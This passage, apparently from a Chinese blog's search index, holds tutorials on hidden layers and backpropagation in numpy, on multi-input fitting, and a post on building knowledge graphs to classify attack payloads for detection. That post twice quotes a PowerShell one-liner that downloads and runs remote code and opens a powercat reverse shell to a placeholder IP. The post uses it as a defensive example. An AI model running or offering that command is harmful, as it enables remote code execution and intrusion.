return_sequences=True))model.add(LSTM(128))\n\n之后就可以开始训练了。最后可以得到一个接近90%的准确率\n\n","categories":["AIlearning"],"tags":["AI"]},{"title":"隐藏层与深度学习","url":"/2022/01/03/%E9%9A%90%E8%97%8F%E5%B1%82%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/","content":"在现实中，判断一个物体，或者说对一个物体下定义，往往不能只从一个方面或两个方面观察。这时候，单个的Rosenblatt感知器已经无法胜任这样复杂的判断，是时候再增加一个神经元了。新增一个神经元，便增加了一个抽象的维度，每个维度通过不断地调整权重并进行激活，从而产生对输入的不同理解，最后再将这些抽象维度中的输出合并并降维得到最后的输出。而这些新添加的神经元，就被称之为隐藏层。\n为了直观的看到效果，我还是使用了matplotlib进行绘图。这一次的w和b的值，我选择使用rand()函数生成随机数。并且为了之后的方便，将sigmoid函数（标准Logistic函数）和前向传播封装为两个函数。\nimport datasetimport matplotlib.pyplot as pltimport numpy as npm = 100xs, ys = dataset.get_beans(m)plt.title(&quot;STF&quot;, fontsize=12)plt.xlabel(&quot;B&quot;)plt.ylabel(&quot;T&quot;)plt.scatter(xs, ys)def sigmoid(x):\treturn 1/(1+np.exp(-x))#第一层#第一个神经元w11_1 = np.random.rand()b1_1 = np.random.rand()#第二个神经元w12_1 = np.random.rand()b2_1 = np.random.rand()#第二层w11_2 = np.random.rand()w21_2 = np.random.rand()b1_2 = np.random.rand()#前向传播def forward(xs):\t#第一层第一个\tz1_1 = w11_1*xs + b1_1\ta1_1 = sigmoid(z1_1)\t#第一层第二个\tz2_1 = w12_1*xs + b2_1\ta2_1 = sigmoid(z2_1)\t#第二层（输出层）\tz1_2 = w11_2*a1_1 + w21_2*a2_1 + b1_2\ta1_2 = sigmoid(z1_2)\treturn a1_2,z1_2,a2_1,z2_1,a1_1,z1_1\n\n这样准备工作就完成了，接下来就是繁琐的隐藏层求导进行反向传播的过程。\nfor _ in range(5000):\tfor i in range(100):\t\tx = xs[i]\t\ty = ys[i]\t\t#先来一次前向传播\t\ta1_2,z1_2,a2_1,z2_1,a1_1,z1_1 = forward(x)\t\t#反向传播\t\t#代价函数e\t\te = (y-a1_2)**2\t\tdeda1_2 = -2*(y - a1_2)\t\tda1_2dz1_2 = a1_2*(1 - a1_2)\t\tdz1_2dw11_2 = a1_1\t\tdz1_2dw21_2 = a2_1\t\tdedw11_2 = deda1_2*da1_2dz1_2*dz1_2dw11_2\t\tdedw21_2 = deda1_2*da1_2dz1_2*dz1_2dw21_2\t\tdz1_2db1_2 = 1\t\tdedb1_2 = deda1_2*da1_2dz1_2*dz1_2db1_2\t\t#隐藏层的第一个神经元\t\tdz1_2da1_1 = w11_2\t\tda1_1dz1_1 = a1_1*(1-a1_1)\t\tdz1_1dw11_1 = x\t\tdedw11_1 = deda1_2*da1_2dz1_2*dz1_2da1_1*da1_1dz1_1*dz1_1dw11_1\t\tdz1_1db1_1 = 1\t\tdedb1_1 = deda1_2*da1_2dz1_2*dz1_2da1_1*da1_1dz1_1*dz1_1db1_1\t\t#隐藏层的第二个神经元\t\tdz1_2da2_1 = w21_2\t\tda2_1dz2_1 = a2_1*(1-a2_1)\t\tdz2_1dw12_1 = x\t\tdedw12_1 = deda1_2*da1_2dz1_2*dz1_2da2_1*da2_1dz2_1*dz2_1dw12_1\t\tdz2_1db2_1 = 1\t\tdedb2_1 = deda1_2*da1_2dz1_2*dz1_2da2_1*da2_1dz2_1*dz2_1db2_1\t\t#梯度下降\t\talpha = 0.03\t\tw11_2 = w11_2 - alpha*dedw11_2\t\tw21_2 = w21_2 - alpha*dedw21_2\t\tb1_2 = b1_2 - alpha*dedb1_2\t\tw12_1 = w12_1 - alpha*dedw12_1\t\tb2_1 = b2_1 - alpha*dedb2_1\t\tw11_1 = w11_1 - alpha*dedw11_1\t\tb1_1 = b1_1 - alpha*dedb1_1\n\n经过漫长的求导与修改错误，最后再使用plt.clf()函数和plt.pause()函数相结合绘制动态图像，就得到了最终的结果。\n\n当隐藏层变得更多与更深，神经网络也会变得更加强大与智能。当我们设计出一个复杂程度恰当的神经网络，经过不断的训练过后，网络中的各个参数被调节成不同的值，而他们组成的整体，就可以近似出一个相当复杂的函数。\n我们一般把隐藏层超过三层的网络称之为深度神经网络。隐藏层的神经元对样本的理解和提取的参数都太过微妙，我们能做的也只有设计一个网络，送入数据进行训练，如果效果好，那它就”起作用了“，效果不好就”没起作用“，只能再次调参，再来一次。这也是为什么深度学习被很多人戏称”炼丹“的原因。\n","categories":["AIlearning"],"tags":["AI"]},{"title":"高维空间——面对多个输入的问题","url":"/2022/01/05/%E9%AB%98%E7%BB%B4%E7%A9%BA%E9%97%B4%E2%80%94%E2%80%94%E9%9D%A2%E5%AF%B9%E5%A4%9A%E4%B8%AA%E8%BE%93%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/","content":"之前我已经讨论了从多个方面观察事物的问题，最后使用增加隐藏层来实现。但至始至终，我都只考虑了一个输入的情况，这也是之前的所有结果均可以在一个平面直角坐标系中画出。而现在，我们来考虑有多个输入的情况，这时，得到的结果便不再是一个平面图像了。\n自然，为了更直观的看到最终拟合的状态，我们需要画一个图。我单独封装了一个plot_utils.py，这样直接import，在需要时就可以直接调用其中的函数。\nimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3Dimport numpy as npdef show_scatter(xs,y):\tx = xs[:,0]\tz = xs[:,1]\tfig = plt.figure()\tax = Axes3D(fig)\tax.scatter(x, z, y)\tplt.show()def show_surface(x,z,forward_propgation):\tx = np.arange(np.min(x),np.max(x),0.1)\tz = np.arange(np.min(z),np.max(z),0.1)\tx,z = np.meshgrid(x,z)\ty = forward_propgation(x,z)\tfig = plt.figure()\tax = Axes3D(fig)\tax.plot_surface(x, z, y, cmap=&#x27;rainbow&#x27;)\tplt.show()def show_scatter_surface(xs,y,forward_propgation):\tx = xs[:,0]\tz = xs[:,1]\tfig = plt.figure()\tax = Axes3D(fig)\tax.scatter(x, z, y)\tx = np.arange(np.min(x),np.max(x),0.01)\tz = np.arange(np.min(z),np.max(z),0.01)\tx,z = np.meshgrid(x,z)\ty = forward_propgation(x,z)\t\tax.plot_surface(x, z, y, cmap=&#x27;rainbow&#x27;)\tplt.show()\n\n而这次，为了展现多个输入的情况，产生数据集的函数也有所不同。\nimport numpy as npdef get_beans(counts):\txs = np.random.rand(counts,2)*2\tys = np.zeros(counts)\tfor i in range(counts):\t\tx = xs[i]\t\tif (x[0]-0.5*x[1]-0.1)&gt;0:\t\t\tys[i] = 1\treturn xs,ysdef get_beans2(counts):\txs = np.random.rand(counts,2)*2\tys = np.zeros(counts)\tfor i in range(counts):\t\tx = xs[i]\t\tif (np.power(x[0]-1,2)+np.power(x[1]-0.3,2))&lt;0.5:\t\t\tys[i] = 1\treturn xs,ys\n\n它会产生一个两列的数组。可以使用numpy库的特性分割开得到两组输入。\nx1s = xs[:,0]#切割第0列形成一个新的数组x2s = xs[:,1]\n\n再将前向传播封装为一个函数：\ndef forward(x1s,x2s):\tz = w1*x1s + w2*x2s + b\ta = 1/(1+np.exp(-z))\treturn a\n\n最后，依旧利用反向传播与梯度下降算法进行学习拟合。\nfor _ in range(500):\tfor i in range(m):\t\tx = xs[i]\t\ty = ys[i]\t\tx1 = x[0]\t\tx2 = x[1]\t\ta = forward(x1,x2)\t\te = (y-a)**2\t\tdeda = -2*(y-a)\t\tdadz = a*(1-a)\t\tdzdw1 = x1\t\tdzdw2 = x2\t\tdzdb = 1\t\tdedw1 = deda*dadz*dzdw1\t\tdedw2 = deda*dadz*dzdw2\t\tdedb = deda*dadz*dzdb\t\talpha = 0.01\t\tw1 = w1 - alpha*dedw1\t\tw2 = w2 - alpha*dedw2\t\tb = b - alpha*dedb\n\n最后我们可以得到这样的结果：\n\n如果我们从另一个角度来看的话，它就和添加了激活函数后的最简单的Rosenblatt感知器模型得到的结果类似：\n\n输入数据的增加会导致维度增加，但最为三维生物我们无法具象化三维以上的模型，但对于计算机来说，增加一个输入就是增加一维数组，这样高维空间的学习与计算对他来说也可以实现\n","categories":["AIlearning"],"tags":["AI"]},{"title":"知识图谱在安全中的应用","url":"/2024/01/20/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%9C%A8%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/","content":"图谱建设层级体系建设相比于深度学习，知识图谱中的知识可以沉淀，具有较强的解释性。\n\n知识图谱的构建可以从多层级＋多维度的方式构建\n多层级可以从基础对象开始，逐级扩大范围，从具体到抽象\n多维度则是丰富对象视角，也可以从具象的丰富到抽象的丰富\n知识图谱的构建所面对的问题：\n①信息来原质量低，导致信息挖掘难度增加\n②数据维度多，导致数据建设效率降低\n③依赖常识&#x2F;专业知识，某些日常对象要结合生活经验，需要探索结合常识知识的语义理解方法，某些对象要求极高的准确度，需要较好的专家和算法相结合的方式来进行高效的图谱构建\n品类打标：对商品图谱的构建来说，关键的一步便是建立起商品和品类之间的关联，即对商品打上品类标签。从安全方面来说，既需要建立payload中的关键字和攻击类型之间的联系。\n以安全为例：\n①攻击类型词表构建：通过对获取的数据集进行分词、NER、新词发现等操作，获得初步的关键字候选词。然后，通过标注少量的样本进行二分类模型的训练（判断一个词是否是同一种攻击类型）。\n②攻击类型打标：首先，我们通过对payload进行命名实体识别，并结合上一步中的攻击类型词表来获取payload中的候选攻击类型，如识别“”中的“”、“alert()”等。在获得了payload以及对应的类型之后，我们利用监督数据训练品类打标的二分类模型，输入payload的SPU_ID和候选类型TAG构成的Pair，即，对它进行是否匹配的预测\n③攻击类型标签后处理：配合其他设备或攻击选择对流量进行拦截或放行。\n类关系挖掘。类似于上文中提到的攻击类型打标方法，我们将同类型payload和上下位构建为的样本，通过在流量数据、日志数据、百科数据等中挖掘的统计特征以及基于Sentence-BERT得到的语义特征，使用二分类模型进行品类关系是否成立的判断。对于训练得到的分类模型，我们同样通过主动学习的方式，选出结果中的难分样本，进行二次标注，进而不断迭代数据，提高模型性能。 \n基于图的品类关系推理。在获得了初步的同类payload、上下位关系之后，我们使用已有的这些关系构建网络，使用GAE、VGAE等方法对网络进行链路预测，从而进行图谱边关系的补全。\n属性维度建设对于一次攻击的全面理解，需要涵盖各个属性维度。例如“powershell IEX (New-Object System.Net.Webclient).DownloadString (‘url’); powercat -c IP -p port -e cmd”，需要挖掘它对应的方式，目的，攻击路径等属性，才能在产品中更好的进行综合判断，进行拦截或放行操作。payload属性挖掘的源数据主要包含攻击类型，攻击方式和半结构化数据三个方面。\n攻击类型包含了对于payload最重要的信息维度，同时，攻击类型解析模型可以应用在查询理解中，对用户快速深入理解拆分，为下游的召回排序也能提供高阶特征。这里我们着重介绍一下利用攻击类型进行属性抽取的方法。\n然而攻击类型解析存在着三大挑战：（1）上下文信息少；（2）依赖专业知识；（3）标注数据通常有较多的噪音。为了解决前两个挑战，我们首先尝试在模型中引入了图谱信息，主要包含以下三个维度：\n\n节点信息：将图谱实体作为词典，以Soft-Lexicon方式接入，以此来缓解NER的边界切分错误问题。\n关联信息：攻击类型解析依赖专业知识，例如在缺乏专业知识的情况下，仅从“powershell IEX (New-Object System.Net.Webclient).DownloadString (‘url’); powercat -c IP -p port -e cmd”中，我们无法确认“powershell IEX”是攻击类型还是攻击方式。因此，我们引入知识图谱的关联数据缓解了专业知识缺失的问题：在知识图谱中，powershell IEX和System，DownloadString，powercat之间存在着“方式-方法-类型”的关联关系，但是powershell跟powercat之间则没有直接的关系，因此可以利用图结构来缓解NER模型常识知识缺少的问题。具体来说，我们利用Graph Embedding的技术对图谱进行的嵌入表征，利用图谱的图结构信息对图谱中的单字，词进行表示，然后将包含了图谱结构信息的嵌入表示和文本语义的表征进行拼接融合，再接入到NER模型之中，使得模型能够既考虑到语义，也考虑到常识知识的信息。\n节点类型信息：同一个词可以代表不同的属性，比如“poweshell”既可以作为品类又可以作为属性。因此，对图谱进行Graph Embedding建模的时候，我们根据不同的类型对实体节点进行拆分。在将图谱节点表征接入NER模型中时，再利用注意力机制根据上下文来选择更符合语义的实体类型对应的表征 ，缓解不同类型下词语含义不同的问题，实现不同类型实体的融合。\n\n\n接下来我们探讨如何缓解标注噪音的问题。在标注过程中，少标漏标或错标的问题无法避免，尤其像在商品标题NER这种标注比较复杂的问题上，尤为显著。对于标注数据中的噪音问题，采用以下方式对噪音标注优化：不再采取原先非0即1的Hard的训练方式，而是采用基于置信度数据的Soft训练方式，然后再通过Bootstrapping的方式迭代交叉验证，然后根据当前的训练集的置信度进行调整。通过实验验证，使用Soft训练+Bootstrapping多轮迭代的方式，在噪声比例比较大的数据集上，模型效果得到了明显提升。具体的方法可参见论文《Iterative Strategy for Named Entity Recognition with Imperfect Annotations》。\n效率提升知识图谱的构建往往是针对于各个领域维度的数据单独制定的挖掘方式。这种挖掘方式重人工，比较低效，针对每个不同的领域、每个不同的数据维度，我们都需要定制化的去建设任务相关的特征及标注数据。在安全场景下，挖掘的维度众多，因此效率方面的提高也是至关重要的。我们首先将知识挖掘任务建模为三类分类任务，包括节点建模、关系建模以及节点关联。在整个模型的训练过程中，最需要进行效率优化的其实就是上述提到的两个步骤：（1）针对任务的特征提取；（2）针对任务的数据标注。\n\n针对特征提取部分，我们摒弃了针对不同挖掘任务做定制化特征挖掘的方式，而是尝试将特征和任务解耦，构建跨任务通用的图谱挖掘特征体系，利用海量的特征库来对目标的节点&#x2F;关系&#x2F;关联进行表征，并利用监督训练数据来进行特征的组合和选择。具体的，我们构建的图谱特征体系主要由四个类型的特征组构成： 1. 规则模板型特征主要是利用人工先验知识，融合规则模型能力。 2. 统计分布型特征，可以充分利用各类语料，基于不同语料不同层级维度进行统计。 3. 句法分析型特征则是利用NLP领域的模型能力，引入分词、词性、句法等维度特征。 4. 嵌入表示型特征，则是利用高阶模型能力，引入BERT等语义理解模型的能力。\n\n针对数据标注部分，我们主要从三个角度来提升效率。 1. 通过半监督学习，充分的利用未标注的数据进行预训练。 2. 通过主动学习技术，选择对于模型来说能够提供最多信息增益的样本进行标注。 3. 利用远程监督方法，通过已有的知识构造远监督样本进行模型训练，尽可能的发挥出已有知识的价值。\n","categories":["AIlearning"],"tags":["AI"]}]